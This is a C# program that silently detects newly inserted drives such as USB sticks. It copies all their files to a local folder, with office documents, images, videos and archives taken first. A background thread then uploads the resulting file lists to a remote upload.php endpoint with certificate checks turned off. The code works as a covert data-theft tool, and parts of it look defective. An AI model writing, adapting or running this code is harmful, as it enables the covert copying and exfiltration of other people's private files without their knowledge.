using System.Net.Http.Headers;
using System.Numerics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

internal class Program
{
    private static Task Main(string[] args)
    {
        string SaveRoot, classRegistered, version;
        string[,] copyRoot = new string[600000, 2];
        bool[] registeredDrive = new bool[26];
        int fileCnt = 0;
        string localSaveRoot = "";
        List<string[]> fileBoot = new List<string[]> { };
        List<string> filePriority = new List<string> { ".xlsx", ".xls", ".pptx", ".ppt", ".png", ".jpg", ".mp4", ".ts", ".zip" };
        StreamReader configFile = new StreamReader("config.txt");
        SaveRoot = configFile.ReadLine();
        classRegistered = configFile.ReadLine();
        version = configFile.ReadLine();
        configFile.Close();

        Directory.CreateDirectory("Upload_Buffer\\File_Stack");
        if (!File.Exists("Upload_Buffer\\File_Stack\\File_Stack.txt"))
        {
            File.Create("Upload_Buffer\\File_Stack\\File_Stack.txt").Close();
        }
        Console.WriteLine("Save to: {0} \nRequest Url: {1} \nversion: {2}", SaveRoot, classRegistered, version);


        void fileMonitor()
        {
            while (true)
            {
                try
                {
                    string[] temp = File.ReadAllLines("Upload_Buffer\\File_Stack\\File_Stack.txt");
                }
                catch { continue; }
                string[] filesInS = File.ReadAllLines("Upload_Buffer\\File_Stack\\File_Stack.txt");
                ulong errorColumn = 0;
                int cnt = 0;
                string[] fileInError = new string[filesInS.Length];
                foreach (string path in filesInS)
                {
                    if (path == "") continue;
                    // Console.WriteLine(Encoding.UTF8.GetString(File.ReadAllBytes(path)));
                    var handler = new HttpClientHandler();
                    handler.ServerCertificateCustomValidationCallback = delegate { return true; };
                    var content = new MultipartFormDataContent();
                    var fileStream = new FileStream(path, FileMode.Open, FileAccess.Read);
                    var fileContent = new StreamContent(fileStream);
                    fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                    {
                        Name = "file",
                        FileName = Uri.EscapeDataString(Path.GetFileName(path))

                    };
                    content.Add(fileContent);
                    try
                    {
                        HttpClient client = new HttpClient(handler);
                        HttpResponseMessage res = client.PostAsync(classRegistered + "upload.php", content).Result;
                        Console.WriteLine(res.Content.ReadAsStringAsync().Result);
                    }
                    catch
                    {
                        fileInError[cnt++] = path;
                    }
                }
                FileStream writeStack = new("Upload_Buffer\\File_Stack\\File_Stack.txt", FileMode.Create, FileAccess.ReadWrite);
                foreach (string path in fileInError)
                {
                    writeStack.Write(Encoding.UTF8.GetBytes(path + "\n"));
                }
                writeStack.Close();
                Thread.Sleep(5000);
            }
        }
        Thread FMThread = new Thread(fileMonitor);
        // FMThread.IsBackground = true;
        FMThread.Start();
        void scanDirectory(string path)
        {
            DirectoryInfo currentDir = new DirectoryInfo(path);
            FileInfo[] files = currentDir.GetFiles();
            DirectoryInfo[] dirs = currentDir.GetDirectories();
            foreach (DirectoryInfo dir in dirs)
            {
                // Console.WriteLine(dir.FullName.Substring(3));
                Directory.CreateDirectory(localSaveRoot + dir.FullName.Substring(3));
                scanDirectory(dir.FullName);
            }
            foreach (FileInfo file in files)
            {
                fileCnt += 1;
                copyRoot[fileCnt, 0] = file.FullName;
                copyRoot[fileCnt, 1] = localSaveRoot + file.FullName.Substring(3);
            }
        }


        DriveInfo[] allDrivesG = DriveInfo.GetDrives();
        Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
        Console.OutputEncoding = Encoding.Unicode;

        foreach (DriveInfo item in allDrivesG)
        {
            if (item.IsReady)
            {
                Encoding gbk = Encoding.GetEncoding("gb18030");
                Encoding utf8 = Encoding.GetEncoding("utf-8");
                byte[] gb = gbk.GetBytes(item.VolumeLabel);
                gb = Encoding.Convert(gbk, utf8, gb);
                Console.WriteLine(utf8.GetString(gb));
            }
            registeredDrive[item.Name[0] - 'A'] = true;
        }
        foreach (bool n in registeredDrive)
        { Console.WriteLine(n); }


        while (true)
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            bool[] visited = new bool[26];
            foreach (DriveInfo item in allDrives)
            {
                visited[item.Name[0] - 'A'] = true;
                if (!registeredDrive[item.Name[0] - 'A'])
                {
                    if (!item.IsReady) continue;
                    registeredDrive[item.Name[0] - 'A'] = true;
                    Encoding gbk = Encoding.GetEncoding("gb18030");
                    Encoding utf8 = Encoding.GetEncoding("utf-8");
                    byte[] gb = gbk.GetBytes(item.VolumeLabel);
                    gb = Encoding.Convert(gbk, utf8, gb);
                    string saveFileName = $"[{(uint)(DateTime.Now - new DateTime(1970, 1, 1, 0, 0, 0, 0)).TotalSeconds}] from[{utf8.GetString(gb)}]";
                    string saveDirName = SaveRoot + $"{saveFileName}\\";
                    Console.WriteLine(saveDirName);
                    fileCnt = 0;
                    localSaveRoot = saveDirName;
                    Directory.CreateDirectory(localSaveRoot);
                    scanDirectory(item.Name);
                    for (int i = 1; i <= fileCnt; i++)
                    {
                        fileBoot.Add(new string[] { copyRoot[i, 0], copyRoot[i, 1] });
                    }
                    fileBoot.Sort((a, b) =>
                    {
                        int p1 = -1000, p2 = -1000;
                        for (int i = 0; i < filePriority.Count; i++)
                        {
                            if (Path.GetExtension(a[0]) == filePriority[i])
                            {
                                p1 = filePriority.Count - i;
                            }
                            if (Path.GetExtension(b[0]) == filePriority[i])
                            {
                                p2 = filePriority.Count - i;
                            }
                        }
                        return -p1 + p2;
                    });
                    StreamWriter menu = new StreamWriter($"Upload_Buffer\\{saveFileName}.txt");
                    for (int i = 0; i < fileCnt; i++)
                    {
                        Console.Write("from " + fileBoot[i][0] + " to " + fileBoot[i][1] + " ...");
                        try
                        {
                            File.Copy(fileBoot[i][0], fileBoot[i][1], true);
                            Console.WriteLine("Done");
                            menu.WriteLine(fileBoot[i][1]);
                        }
                        catch { continue; }
                    }
                    menu.Close();
                    File.AppendAllText("Upload_Buffer\\File_Stack\\File_Stack.txt", $"Upload_Buffer\\{saveFileName}.txt\r\n");
                    /*
                    try
                    {
                        var handler = new HttpClientHandler();
                        handler.ServerCertificateCustomValidationCallback = delegate { return true; };
                        var content = new MultipartFormDataContent();
                        content.Add(new ByteArrayContent(File.ReadAllBytes($"Upload_Buffer\\{saveFileName}.txt")), "file", Uri.EscapeDataString($"{saveFileName}.txt"));
                        HttpClient client = new HttpClient(handler);
                        await client.PostAsync(classRegistered + "upload.php", content);
                    }
                    catch { }
                    */

                }
            }
            for (int i = 0; i < 26; i++)
            {
                if (!visited[i] && registeredDrive[i])
                {
                    registeredDrive[i] = false;
                }
            }
            Thread.Sleep(1000);
        }
    }
}
